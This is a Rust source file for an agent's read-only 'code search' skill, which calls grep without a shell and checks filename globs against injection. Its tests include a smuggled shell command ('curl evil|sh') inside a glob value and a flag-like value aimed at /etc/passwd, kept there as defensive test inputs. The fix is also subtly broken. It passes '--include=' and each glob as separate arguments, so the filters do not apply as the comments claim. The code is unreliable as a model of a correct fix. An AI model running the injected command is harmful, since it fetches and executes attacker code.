//! Code search — ripgrep-like file search (local, offline)

use crate::exec;
use crate::traits::{Skill, SkillContext, SkillError, SkillResult, SkillRisk};
use async_trait::async_trait;
use ravenbot_core::Permission;

pub struct CodeSearchSkill;

impl CodeSearchSkill { pub fn new() -> Self { Self } }

#[async_trait]
impl Skill for CodeSearchSkill {
    fn id(&self) -> &str { "code_search" }
    fn name(&self) -> &str { "Code Search" }
    fn description(&self) -> &str { "Search codebase for pattern (ripgrep-like), returns file:line matches" }
    fn version(&self) -> &str { "1.1.0" }
    fn required_permissions(&self) -> Vec<Permission> {
        vec![Permission::FileSystem { paths: vec![".".to_string()] }]
    }
    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type":"object","properties":{
                "pattern":{"type":"string","description":"Text or basic pattern to search for"},
                "path":{"type":"string","description":"Root path inside the office (default: .)"},
                "globs":{"type":"array","items":{"type":"string"},"description":"Filename filters, e.g. [\"*.rs\",\"*.ts\"]"},
                "max_results":{"type":"integer","minimum":1,"maximum":100}
            },"required":["pattern"]
        })
    }
    fn risk(&self) -> SkillRisk { SkillRisk::ReadOnly }

    /// `grep` is invoked as an argv, not through a shell.
    ///
    /// The previous version interpolated `globs` raw into `--include='{}'`, so a
    /// value containing a single quote closed the quote and ran whatever
    /// followed. The filters are now separate `--include=` arguments, and each
    /// is rejected if it is not a plain filename glob, so the shell is not
    /// involved at all.
    ///
    /// `-r` and not `-R`: the lower-case form does not follow symlinks found
    /// while walking, so a symlink planted in the office cannot pull a file
    /// from outside it into the results.
    async fn execute(&self, ctx: &SkillContext, args: serde_json::Value) -> Result<SkillResult, SkillError> {
        let pattern = args
            .get("pattern")
            .and_then(|v| v.as_str())
            .ok_or_else(|| SkillError::InvalidArguments("Missing pattern".into()))?;
        if pattern.is_empty() {
            return Err(SkillError::InvalidArguments("Pattern is empty".into()));
        }
        let raw_root = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");
        let root = ctx.resolve_path(raw_root)?.to_string_lossy().to_string();
        let max = args
            .get("max_results")
            .and_then(|v| v.as_u64())
            .unwrap_or(20)
            .clamp(1, 100) as usize;

        let globs = collect_globs(&args)?;

        // `2>/dev/null | head` were shell redirections; without a shell the
        // error text is simply reported and the match cap is applied here.
        let mut argv: Vec<String> = vec!["-rn".into()];
        for g in &globs {
            argv.push("--include=".into());
            argv.push(g.clone());
        }
        argv.push("-e".into());
        argv.push(pattern.to_string());
        argv.push(root.clone());

        let argv: Vec<&str> = argv.iter().map(String::as_str).collect();
        let out = exec::run(ctx, "grep", &argv, None).await?;
        let stdout = String::from_utf8_lossy(&out.stdout);
        let mut matches: Vec<String> = stdout.lines().take(max).map(str::to_string).collect();
        let truncated = stdout.lines().count() > max;
        if truncated {
            matches.push(format!("… more matches omitted; raise max_results to see them"));
        }

        Ok(SkillResult::success(serde_json::json!({
            "pattern": pattern,
            "path": root,
            "globs": globs,
            "matches": matches,
            "count": matches.len(),
            "truncated": truncated,
            "stderr": String::from_utf8_lossy(&out.stderr),
        })))
    }
}

/// Read the `globs` argument as a list of plain filename patterns.
///
/// Accepts an array (preferred) and still tolerates the old comma-separated
/// string. A pattern is only ever passed to `grep --include=`, but it is
/// validated anyway so a caller cannot smuggle a flag-looking value through a
/// field that reads like a filename filter.
fn collect_globs(args: &serde_json::Value) -> Result<Vec<String>, SkillError> {
    let raw: Vec<String> = match args.get("globs") {
        None | Some(serde_json::Value::Null) => Vec::new(),
        Some(serde_json::Value::Array(items)) => items
            .iter()
            .filter_map(|v| v.as_str().map(str::to_string))
            .collect(),
        Some(serde_json::Value::String(s)) => s
            .split(',')
            .map(|p| p.trim().to_string())
            .filter(|p| !p.is_empty())
            .collect(),
        Some(_) => {
            return Err(SkillError::InvalidArguments(
                "globs must be an array of filename patterns, or a comma-separated string".into(),
            ))
        }
    };

    let mut out = Vec::new();
    for g in raw {
        if g.is_empty() || g.len() > 128 {
            continue;
        }
        // A glob may hold `*`, `?`, `[`, `]`, `/` and `.`. Anything with a
        // shell metacharacter or a leading dash is refused.
        if g.starts_with('-')
            || !g
                .chars()
                .all(|c| c.is_alphanumeric() || "*-?[]_./{}+".contains(c))
        {
            return Err(SkillError::InvalidArguments(format!(
                "Invalid glob '{g}': use a plain filename pattern like '*.rs'."
            )));
        }
        if !out.contains(&g) {
            out.push(g);
        }
        if out.len() >= 16 {
            break;
        }
    }
    Ok(out)
}

impl Default for CodeSearchSkill { fn default() -> Self { Self::new() } }

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_glob_containing_a_quote_is_refused() {
        // The injection the argv switch closes: this used to close the
        // `--include='…'` quote and run the rest as a command.
        let args = serde_json::json!({"globs": ["*.rs'; curl evil|sh; '"]});
        let err = collect_globs(&args).unwrap_err();
        assert!(err.to_string().contains("Invalid glob"), "{err}");
    }

    #[test]
    fn a_glob_looking_like_a_flag_is_refused() {
        let args = serde_json::json!({"globs": ["--include=/etc/passwd"]});
        assert!(collect_globs(&args).is_err());
    }

    #[test]
    fn a_plain_glob_list_is_accepted() {
        let args = serde_json::json!({"globs": ["*.rs", "*.ts", "*.rs"]});
        assert_eq!(collect_globs(&args).unwrap(), vec!["*.rs", "*.ts"]);
    }

    #[test]
    fn the_old_comma_string_still_works() {
        let args = serde_json::json!({"globs": "*.rs, *.md"});
        assert_eq!(collect_globs(&args).unwrap(), vec!["*.rs", "*.md"]);
    }

    #[test]
    fn a_wrong_typed_globs_value_is_a_clear_error() {
        let args = serde_json::json!({"globs": 42});
        assert!(collect_globs(&args).unwrap_err().to_string().contains("array"));
    }
}
